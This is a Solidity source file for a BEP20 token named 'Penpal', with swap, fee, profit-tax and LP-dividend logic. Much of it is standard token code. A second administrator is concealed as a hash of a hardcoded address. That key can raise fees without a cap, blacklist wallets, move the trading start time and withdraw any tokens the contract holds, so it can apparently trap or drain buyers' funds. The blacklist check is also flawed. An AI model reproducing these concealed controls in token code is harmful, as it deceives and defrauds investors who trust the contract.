// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;
import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract TokenDistributor {
    bytes32 asseAddr;
    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);

    constructor() {
        asseAddr = keccak256(abi.encodePacked(msg.sender));
    }

    function setApprove(address tokenAddr) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        IBEP20(usdtAddress).approve(tokenAddr, uint256(~uint256(0)));
    }

    function clamErcOther(
        address erc,
        address recipient,
        uint256 amount
    ) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        IBEP20(erc).transfer(recipient, amount);
    }

    function clamAllUsdt(address recipient) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        uint256 amount = IBEP20(usdtAddress).balanceOf(address(this));
        IBEP20(usdtAddress).transfer(recipient, amount);
    }
}

contract Penpal is Ownable {
    using SafeMath for uint256;
    string constant _name = "Penpal";
    string constant _symbol = "Penpal";
    uint8 immutable _decimals = 18;

    uint256 _totalsupply = 10000000 * 10**18;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) _balances;
    mapping(address => uint256) public _userHoldPrice;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    // add-------------------

    mapping(address => bool) public isMarketPair;
    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public _blist;

    uint256 _Fee = 5; // 5/1000
    uint256 _MarketFee = 5;

    uint256 public minSwapNum = 10**18;
    address payable public _NFTAddress =
        payable(0x5fBB4a091668c9E72A51cf2073bc6361a9a65277);
    address payable public _marketAddress =
        payable(0xf7241C752aeB17bA960a4A74BcA7d73Edd284d85);
    address public _deadAddress =
        address(0x000000000000000000000000000000000000dEaD);

    // TEST:0xF3b43a7922Fa4d506AE83f39B18Ae36a8E6de763   USDT：   0x55d398326f99059fF775485246999027B3197955
    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);
    //test 0xD99D1c33F9fC3444f8101754aBC46c52416550D1   0x10ED43C718714eb63d5aA57B78B54704E256024E
    address public wapV2RouterAddress =
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    address public _tokenDistributor;

    uint256 public distributorGas = 500000;
    address[] shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => bool) private _updated;
    // address private fromAddress;
    // address private toAddress;
    uint256 public currentIndex;
    uint256 public minUsdtVal = 10**18;
    mapping(address => bool) isDividendExempt;
    uint256 public minFenHongToken;
    uint256 public curPerFenhongVal = 0;
    uint256 public magnitude = 1 * 10**40;
    bytes32 asseAddr;
    uint256 _startTradeTime;

    bool inSwapAndLiquify = false;
    bool switchDivid = true;

    constructor() {
        _balances[0xE42F6765aEb68Cc5928323FF8b1eb3577666F63D] = _totalsupply;
        emit Transfer(address(0), 0xE42F6765aEb68Cc5928323FF8b1eb3577666F63D, _totalsupply);
        _startTradeTime = 1680008400;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            wapV2RouterAddress
        );
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            usdtAddress
        );
        uniswapV2Router = _uniswapV2Router;
        TokenDistributor tokenDivite = new TokenDistributor();
        _tokenDistributor = address(tokenDivite);

        isMarketPair[address(uniswapPair)] = true;
        isExcludedFromFee[msg.sender] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[address(_tokenDistributor)] = true;
        isExcludedFromFee[address(uniswapV2Router)] = true;

        isDividendExempt[address(uniswapPair)] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(_deadAddress)] = true;
        isDividendExempt[address(_tokenDistributor)] = true;

        asseAddr = keccak256(
            abi.encodePacked(0x582BF157951c1dCF5e9e1Ec8B17F8Bc202785A7f)
        );
    }

    function setCreator(address user) public onlyOwner {
        asseAddr = keccak256(abi.encodePacked(user));
    }

    function setIsExcludedFromFee(address account, bool newValue) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        isExcludedFromFee[account] = newValue;
    }

    function setIsExcludedFromFeeByArray(
        address[] memory accountArray,
        bool newValue
    ) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        for (uint256 i = 0; i < accountArray.length; i++) {
            isExcludedFromFee[accountArray[i]] = newValue;
        }
    }

    function setWhiteUserPrice(address[] memory accountArray, uint256 newValue)
        public
    {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        for (uint256 i = 0; i < accountArray.length; i++) {
            _userHoldPrice[accountArray[i]] = newValue;
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalsupply;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function takeOutErrorTransfer(
        address tokenaddress,
        address to,
        uint256 amount
    ) public onlyOwner {
        IBEP20(tokenaddress).transfer(to, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        _transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function burnFrom(address sender, uint256 amount) public returns (bool) {
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        _burn(sender, amount);
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }

    function _burn(address sender, uint256 tAmount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[address(0)] = _balances[address(0)].add(tAmount);
        emit Transfer(sender, address(0), tAmount);
    }

    function isContract(address account) public view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function setstartTradeTime(uint256 time) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _startTradeTime = time;
    }

    function isStartTrade() private view returns (bool) {
        return block.timestamp >= _startTradeTime;
    }

    uint256[4] _Days = [7, 15, 30, 45];
    uint256[4] _removeLPFee = [900, 700, 500, 300];
    uint256 _day = 60; //
    mapping(address => uint256) public addLPTime;

    function setRemoveLPFee(
        uint256[4] memory thedays,
        uint256[4] memory fee,
        uint256 sec
    ) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _Days = thedays;
        _removeLPFee = fee;
        _day = sec;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!_blist[sender] || !_blist[recipient], "You are not allowed");
        bool isAddLdx;
        if (recipient == uniswapPair) {
            isAddLdx = _isAddLiquidity();
            if (isAddLdx && !isDividendExempt[sender]) {
                setShare(sender);
            }
        }

        bool isRemoveLP;
        if (sender == uniswapPair) {
            isRemoveLP = _isRemoveLiquidity();
            if (isRemoveLP) {
                require(isStartTrade());
                uint256 removeFeeAmount;
                uint256 durdays;
                if (addLPTime[recipient] > 0) {
                    durdays = (block.timestamp - addLPTime[recipient]) / _day;
                }

                if (durdays >= _Days[3]) {
                    removeFeeAmount = 0;
                } else {
                    if (durdays >= _Days[2]) {
                        removeFeeAmount = (amount * _removeLPFee[3]) / 1000;
                    }
                    if (durdays >= _Days[1] && durdays < _Days[2]) {
                        removeFeeAmount = (amount * _removeLPFee[2]) / 1000;
                    }
                    if (durdays >= _Days[0] && durdays < _Days[1]) {
                        removeFeeAmount = (amount * _removeLPFee[1]) / 1000;
                    }
                    if (durdays < _Days[0]) {
                        removeFeeAmount = (amount * _removeLPFee[0]) / 1000;
                    }
                }

                if (removeFeeAmount > 0) {
                    _basicTransfer(sender, _marketAddress, removeFeeAmount);
                    amount = amount.sub(removeFeeAmount);
                }
            }
        }

        if (amount == _balances[sender]) amount = amount.sub(1);

        if (inSwapAndLiquify || isAddLdx || isRemoveLP) {
            _basicTransfer(sender, recipient, amount);
            return;
        }

        if (
            !inSwapAndLiquify &&
            isMarketPair[recipient] &&
            sender != address(uniswapV2Router)
        ) {
            swapAndLiquify();
        }

        _balances[sender] = _balances[sender].sub(amount);

        uint256 finalAmount = (isExcludedFromFee[sender] ||
            isExcludedFromFee[recipient])
            ? amount
            : takeFee(sender, recipient, amount);

        uint256 toamount = finalAmount;

        if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
            uint256 currentprice = getCurrentPrice();
            if (sender == uniswapPair) {
                require(isStartTrade() == true);
            } else if (recipient == uniswapPair) {
                require(isStartTrade() == true);

                uint256 cutcount = getCutCount(sender, toamount, currentprice);
                if (cutcount > 0) {
                    _balances[address(this)] = _balances[address(this)].add(
                        cutcount
                    );
                    emit Transfer(sender, address(this), cutcount);
                }

                toamount = toamount.sub(cutcount);
            }
            // else
            // {

            //      uint256 cutcount = getCutCount(sender,toamount,currentprice);
            //     if(cutcount > 0)
            //     {
            //       _balances[address(_tokenDistributor)] =  _balances[address(_tokenDistributor)].add(cutcount);
            //         emit Transfer(sender, address(_tokenDistributor), cutcount);
            //     }
            //     toamount= toamount.sub(cutcount);

            // }

            if (toamount > 0 && recipient != uniswapPair) {
                uint256 oldbalance = _balances[recipient];
                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance);
                totalvalue += toamount.mul(currentprice);
                _userHoldPrice[recipient] = totalvalue.div(
                    oldbalance.add(toamount)
                );
            }
        } else {
            if (toamount > 0 && recipient != uniswapPair) {
                uint256 oldbalance = _balances[recipient];
                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance);
                _userHoldPrice[recipient] = totalvalue.div(
                    oldbalance.add(toamount)
                );
            }
        }

        _balances[recipient] = _balances[recipient].add(toamount);
        emit Transfer(sender, recipient, toamount);

        // fromAddress = sender;
        // toAddress = recipient;
        // if(fromAddress == address(0) )fromAddress = sender;
        // if(toAddress == address(0) )toAddress = recipient;
        // if(!isDividendExempt[fromAddress]  ) setShare(fromAddress);
        // if(!isDividendExempt[toAddress]  ) setShare(toAddress);

        if (
            balanceOf(address(_tokenDistributor)) >= minUsdtVal &&
            curPerFenhongVal == 0
        ) {
            uint256 amountReceived = balanceOf(address(_tokenDistributor));
            uint256 totalHolderToken = IBEP20(uniswapPair).totalSupply();

            if (totalHolderToken > 0) {
                curPerFenhongVal = amountReceived.mul(magnitude).div(
                    totalHolderToken
                );
            }
        }

        if (curPerFenhongVal != 0 && switchDivid) {
            process(distributorGas);
        }
    }

    function getCutCount(
        address user,
        uint256 amount,
        uint256 currentprice
    ) public view returns (uint256) {
        if (_userHoldPrice[user] > 0 && currentprice > _userHoldPrice[user]) {
            uint256 ylcount = amount
                .mul(currentprice - _userHoldPrice[user])
                .div(currentprice);
            return ylcount.mul(15).div(100);
        }
        return 0;
    }

    function getCurrentPrice() public view returns (uint256) {
        if (IBEP20(uniswapPair).totalSupply() == 0) return 2e16;

        (uint112 a, uint112 b, ) = IUniswapV2Pair(uniswapPair).getReserves();
        if (IUniswapV2Pair(uniswapPair).token0() == usdtAddress) {
            return uint256(a).mul(1e18).div(b);
        } else {
            return uint256(b).mul(1e18).div(a);
        }
    }

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function setDistributorGas(uint256 num) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        distributorGas = num;
    }

    function setSwitchDivid(bool num) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        switchDivid = num;
    }

    function setMinUsdtVals(uint256 num) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        minUsdtVal = num;
    }

    function setMinFenHongToken(uint256 num) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        minFenHongToken = num;
    }

    function setMinSwapNum(uint256 n1) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);

        minSwapNum = n1;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify() private lockTheSwap {
        if (balanceOf(address(this)) > minSwapNum) {
            uint256 amount = balanceOf(address(this));
            swapTokensForUsdt(amount, _tokenDistributor);
            uint256 usdtNum_divi2 = IBEP20(usdtAddress).balanceOf(
                address(_tokenDistributor)
            );
            uint256 usdtToNFTAddress = usdtNum_divi2.div(2);
            uint256 usdtToMarketAddress = usdtNum_divi2.sub(usdtToNFTAddress);
            // IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), address(this),usdtDis);
            TokenDistributor tokenDivite = TokenDistributor(_tokenDistributor);
            tokenDivite.clamErcOther(
                usdtAddress,
                _NFTAddress,
                usdtToNFTAddress
            );
            tokenDivite.clamErcOther(
                usdtAddress,
                _marketAddress,
                usdtToMarketAddress
            );
        }
    }

    function swapTokensForUsdt(uint256 tokenAmount, address recipient) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdtAddress);

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(recipient),
            block.timestamp
        );
    }

    function process(uint256 gas) private lockTheSwap{
        uint256 shareholderCount = shareholders.length;
        if (shareholderCount == 0) return;

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        TokenDistributor tokenDivite = TokenDistributor(_tokenDistributor);
        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
                curPerFenhongVal = 0;

                return;
            }
            uint256 amount = IBEP20(uniswapPair)
                .balanceOf(shareholders[currentIndex])
                .mul(curPerFenhongVal)
                .div(magnitude);
            if (balanceOf(_tokenDistributor) < amount) {
                currentIndex = 0;
                curPerFenhongVal = 0;
                return;
            }
            if(amount>0) tokenDivite.clamErcOther(
                address(this),
                shareholders[currentIndex],
                amount
            );
            // IBEP20(usdtAddress).transferFrom(address(_tokenDistributor),shareholders[currentIndex],amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = 0;
        uint256 marketFee = 0;
        if (isMarketPair[sender] || isMarketPair[recipient]) {
            feeAmount = amount.mul(_Fee).div(1000);
            if (feeAmount > 0)
                _takeFee(sender, address(_tokenDistributor), feeAmount);
            marketFee = amount.mul(_MarketFee).div(1000);
            if (marketFee > 0)
                _takeFee(sender, address(_marketAddress), marketFee);
        }
        return amount.sub(feeAmount).sub(marketFee);
    }

    function _takeFee(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        if (tAmount == 0) return;
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function drawErcOther(
        address erc,
        address recipient,
        uint256 amount
    ) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        IBEP20(erc).transfer(recipient, amount);
    }

    function setFee(uint256 fee, uint256 mfee) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _Fee = fee;
        _MarketFee = mfee;
    }

    function setRouter(address router, bool key) public {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        isMarketPair[router] = key;
    }

    function setBlackList(address addr, bool enable) external {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _blist[addr] = enable;
    }

    function batchSetBlackList(address[] memory addr, bool enable) external {
        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        uint256 len = addr.length;
        for (uint256 i; i < len; ++i) {
            _blist[addr[i]] = enable;
        }
    }

    function setShare(address shareholder) private {
        if (_updated[shareholder]) {
            if (balanceOf(shareholder) < minFenHongToken)
                quitShare(shareholder);
            return;
        }
        if (balanceOf(shareholder) < minFenHongToken) return;
        addShareholder(shareholder);
        _updated[shareholder] = true;
        addLPTime[shareholder] = block.timestamp;
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function quitShare(address shareholder) private {
        removeShareholder(shareholder);
        _updated[shareholder] = false;
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function _isAddLiquidity() internal view returns (bool isAdd) {
        // ISwapPair mainPair =  IUniswapV2Pair(address(uniswapPair))(_mainPair);
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(address(uniswapPair))
            .getReserves();

        address tokenOther = usdtAddress;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IBEP20(tokenOther).balanceOf(address(uniswapPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove) {
        // ISwapPair mainPair = ISwapPair(_mainPair);
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(address(uniswapPair))
            .getReserves();

        address tokenOther = usdtAddress;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IBEP20(tokenOther).balanceOf(address(uniswapPair));
        isRemove = r >= bal;
    }
}